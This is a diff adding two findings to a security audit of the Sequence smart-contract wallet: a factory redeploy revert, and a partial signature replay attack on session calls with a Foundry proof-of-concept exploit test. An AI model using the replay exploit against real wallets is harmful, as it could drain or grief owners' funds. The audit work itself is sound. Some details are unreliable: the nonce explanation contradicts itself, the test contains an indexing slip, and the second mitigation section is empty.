@@ -465,6 +465,278 @@ function hashCallWithReplayProtection(
 
 For stronger protection, include a hash of the specific permission rules or attestation content based on the type of session rather than just the index.
 
+
+### [M-2] `deploy` in `Factory.sol` reverts when deploying a wallet that already exists
+
+**Description** The `deploy` function in `Factory.sol` uses `create2` to deploy wallet contracts at deterministic addresses based on the main module and a salt. If a wallet with the same main module and salt has already been deployed, any subsequent attempt to deploy it again will revert. 
+
+*Documentation of ERC-4337 states:*
+
+```
+If the factory does use CREATE2 0xF5 or some other deterministic method to create the Account, it’s expected to return the Account address even if it had already been created. 
+```
+
+Additionally, as per the current design of Sequence wallet, **Sequence wallets fully support ERC-4337 account abstraction** as stated in the documentation. Therefore, the factory should allow multiple calls to `deploy` with the same parameters to return the existing wallet address instead of reverting.
+
+Code Example from `Factory.sol`:
+
+```solidity
+function deploy(address _mainModule, bytes32 _salt) public payable returns (address _contract) {
+    bytes memory code = abi.encodePacked(Wallet.creationCode, uint256(uint160(_mainModule)));
+    assembly {
+      _contract := create2(callvalue(), add(code, 32), mload(code), _salt)
+    }
+    if (_contract == address(0)) {
+      revert DeployFailed(_mainModule, _salt);
+    }
+  }
+```
+**Impact**
+1. Compatibility break with ERC-4337
+2. DoS as a result of front-running
+
+**Proof of Concepts**
+1. Deploy a wallet using specific main module and salt.
+2. Attempt to deploy the same wallet again with the same parameters.
+3. Second deployment reverts instead of returning the existing wallet address with `CreateCollision` error.
+
+```solidity
+  function test_deployTwice_Reverts(address _mainModule, bytes32 _salt) external {
+    address result = factory.deploy(_mainModule, _salt);
+    console2.log("result.code.length: ", result.code.length);
+     assertEq(result.code.length, 33, "Wallet size mismatch");
+     
+    vm.expectRevert();
+    result = factory.deploy(_mainModule, _salt);
+    // assertEq(result.code.length, 33, "Wallet size mismatch");
+  }
+```
+
+**Recommended mitigation** 
+Modify the `deploy` function to check if the wallet already exists at the computed address. If it does, return the existing address instead of attempting to deploy again.
+
+```diff
+function deploy(address _mainModule, bytes32 _salt) public payable returns (address _contract) {
+    bytes memory code = abi.encodePacked(Wallet.creationCode, uint256(uint160(_mainModule)));
++   bytes32 codeHash = keccak256(code);
++   bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, codeHash));
++   address predictedAddress = address(uint160(uint256(hash)));
++   if (predictedAddress.code.length != 0) {
++     return predictedAddress; // Return existing wallet address
++   }
+    assembly {
+      _contract := create2(callvalue(), add(code, 32), mload(code), _salt)
+    }
+    if (_contract == address(0)) {
+      revert DeployFailed(_mainModule, _salt);
+    }
+  }
+```
+
+### [M-3] Partial signature replay / front-running attack on session calls
+
+**Description** When a session call with `BEHAVIOR_REVERT_ON_ERROR` behavior fails, the entire execution reverts but the signature remains valid, since nonce is not yet consumed. Attackers can forge a valid partial signature from failed multi-call session, executing partial calls that were never intended to run independently using the siganture which was meant for the complete payload. 
+
+Due to the lack of binding between the individual call hashes and signer, an attacker can extract the specific calls from the failed session signature and replay them to execute only those calls.
+
+Moreover, if an attacker has access to mempool, they can frontrun a multi-call session to execute only a subset of calls to either grief the legitmiate call, or inflict financial damage to the wallet owners.
+
+Code Example from `Calls.sol`:
+
+- The nonce is consumed before the signature validation and execution of calls.
+
+```solidity
+function execute(bytes calldata _payload, bytes calldata _signature) external payable virtual nonReentrant {
+    uint256 startingGas = gasleft();
+    Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);
+
+@>  _consumeNonce(decoded.space, decoded.nonce);
+    (bool isValid, bytes32 opHash) = signatureValidation(decoded, _signature);
+
+    if (!isValid) {
+      revert InvalidSignature(decoded, _signature);
+    }
+
+    _execute(startingGas, opHash, decoded);
+  }
+```
+
+If one of the calls in a mutli-call session fails with `BEHAVIOR_REVERT_ON_ERROR`, the entire transaction reverts but the nonce remains unconsumed, allowing the signature to be reused.
+
+```solidity
+ function _execute(uint256 _startingGas, bytes32 _opHash, Payload.Decoded memory _decoded) private {
+    bool errorFlag = false;
+
+    uint256 numCalls = _decoded.calls.length;
+    for (uint256 i = 0; i < numCalls; i++) {
+      Payload.Call memory call = _decoded.calls[i];
+
+      if (call.onlyFallback && !errorFlag) {
+        emit CallSkipped(_opHash, i);
+        continue;
+      }
+      errorFlag = false;
+      uint256 gasLimit = call.gasLimit;
+      if (gasLimit != 0 && gasleft() < gasLimit) {
+        revert NotEnoughGas(_decoded, i, gasleft());
+      }
+
+      bool success;
+      if (call.delegateCall) {
+        (success) = LibOptim.delegatecall(
+          [...]
+        );
+      } else {
+       
+        (success) = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);
+      }
+
+      if (!success) {
+        [...]
+
+@>      if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {
+          revert Reverted(_decoded, i, LibOptim.returnData());
+        }
+        [...]
+      }
+
+      emit CallSucceeded(_opHash, i);
+    }
+  }
+```
+
+At this point, the *signature* is publicly **visible** and still valid, because nonce usage is not recorded on Calls contract yet. Session signatures are validated per-call using individual call hashes, which makes partial signature replay attack possible:
+
+```solidity
+{
+  bytes32 r;
+  bytes32 s;
+  uint8 v;
+  (r, s, v, pointer) = encodedSignature.readRSVCompact(pointer);
+  bytes32 callHash = hashCallWithReplayProtection(payload, i);
+  callSignature.sessionSigner = ecrecover(callHash, v, r, s);
+  if (callSignature.sessionSigner == address(0)) {
+    revert SessionErrors.InvalidSessionSigner(address(0));
+  }
+}
+```
+Consider the following:
+- Original Payload: Calls [A, B, C] with signatures [SigA, SigB, SigC]
+- Execution: [A: succeed, B: succeed, C: revert]
+- Result: Entire transaction reverts, nonce remains unused
+- Attack: Extract [A, B] with [SigA, SigB] and replay as new execution
+  
+**Impact** 
+1. Enabling attackers to execute the calls that were intended to be part of a larger atomic opeartion, potentially causing financial loss or state inconistencies.
+2. Frontrunning multi-call sessions to execute only a subset of calls, disrupting the intended operation.
+
+**Proof of Concepts**
+
+Paste the following test code in a new file [`PartialSignatureReplayAttack.t.sol`](test/extensions/sessions/PartialSignatureReplayAttack.sol)
+
+<details>
+<summary>Proof Of Code</summary>
+
+```solidity
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.27;
+
+import { ExtendedSessionTestBase, Factory } from "../../integrations/extensions/sessions/ExtendedSessionTestBase.sol";
+
+import { Stage1Module } from "src/Stage1Module.sol";
+import { SessionPermissions, SessionUsageLimits } from "src/extensions/sessions/explicit/IExplicitSessionManager.sol";
+import {
+  ParameterOperation, ParameterRule, Permission, UsageLimit
+} from "src/extensions/sessions/explicit/Permission.sol";
+import { Payload } from "src/modules/Payload.sol";
+import { Emitter } from "test/mocks/Emitter.sol";
+import { PrimitivesRPC } from "test/utils/PrimitivesRPC.sol";
+import { console2 } from 'forge-std/console2.sol';
+
+contract PartialSignatureReplayAttack is ExtendedSessionTestBase {
+
+  function test_execute_partial_Signature_Replay_Attack() external {
+    Emitter emitter = new Emitter();
+    Payload.Decoded memory payloadWalletA = _buildPayload(2);
+    //creating payloads
+    payloadWalletA.calls[0] = Payload.Call({
+      to: address(emitter),
+      value: 0,
+      data: abi.encodeWithSelector(emitter.explicitEmit.selector),
+      gasLimit: 10_000,
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
+    });
+    
+    //creating this payload to fail, so the nonce couldn't be consumed
+    payloadWalletA.calls[1] = Payload.Call({
+      to: address(emitter),
+      value: 1000000000000000000, //1 ether
+      data: abi.encodeWithSelector(emitter.receiveEther.selector),
+      gasLimit: 21_000,
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
+    });
+
+    bytes memory packedPayloadA = PrimitivesRPC.toPackedPayload(vm, payloadWalletA);
+
+    // Session permissions
+    SessionPermissions memory sessionPerms = SessionPermissions({
+      signer: sessionWallet.addr,
+      chainId: block.chainid,
+      valueLimit: 0,
+      deadline: uint64(block.timestamp + 1 days),
+      permissions: new Permission[](2)
+    });
+
+    sessionPerms.permissions[0] = Permission({ target: address(emitter), rules: new ParameterRule[](0) });
+    sessionPerms.permissions[1] = Permission({ target: address(emitter), rules: new ParameterRule[](0) });
+
+    string memory topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
+    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
+    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
+    (Stage1Module walletA, string memory configA, bytes32 imageHashA) = _createWallet(topology);
+
+    Factory secondaryFactory = new Factory();
+    Stage1Module secondaryModule = new Stage1Module(address(secondaryFactory), address(entryPoint));
+    //deploying another wallet that shares the same configuration as walletA
+    Stage1Module walletB = Stage1Module(payable(secondaryFactory.deploy(address(secondaryModule), imageHashA)));
+
+    uint8[] memory permissionIndx = new uint8[](2);
+    permissionIndx[0] = 0;
+    permissionIndx[0] = 1;
+    bytes memory signatureA = _validExplicitSignature(payloadWalletA, sessionWallet, configA, topology, permissionIndx);
+
+    //Execute the payload using the encodedSignature of wallet A -> legitimate and reverts due to insufficient funds => nonce not consumed
+    vm.prank(address(walletA));
+    vm.expectRevert();
+    walletA.execute(packedPayloadA, signatureA);
+
+    //Wallet B reusing the signature of wallet A and executing the partial payload by just calling call[0]
+    Payload.Call[] memory calls = payloadWalletA.calls;
+    assembly{
+        mstore(calls,1)
+    }
+
+    bytes memory packedPayloadB = PrimitivesRPC.toPackedPayload(vm, payloadWalletA);
+
+    Permission[] memory permissions = sessionPerms.permissions;
+    assembly {
+        mstore(permissions, 1)
+    }
+    vm.prank(address(walletB));
+    //Signature replay arrack with partial payload
+    walletB.execute(packedPayloadB, signatureA);
+  }
+}
+
+```
+</details>
+
+**Recommended mitigation**
+
 ### [L-1] The NESTED flag implementation incorrectly masks bits in `recoverBranch()` of `BaseSig.sol`
 
 **Description** The `NESTED` flag implementation incorrectly masks bits in `recoverBranch()`, swapping the interpretation of external *weight* and *internal threshold*. While the documentation and other flag types **(FLAG_SIGNATURE_SAPIENT, FLAG_SIGNATURE_ERC1271)** consistently use lower 2 bits for weight and upper 2 bits for size/threshold, the `NESTED` flag code reverses this order, creating a critical logic error.
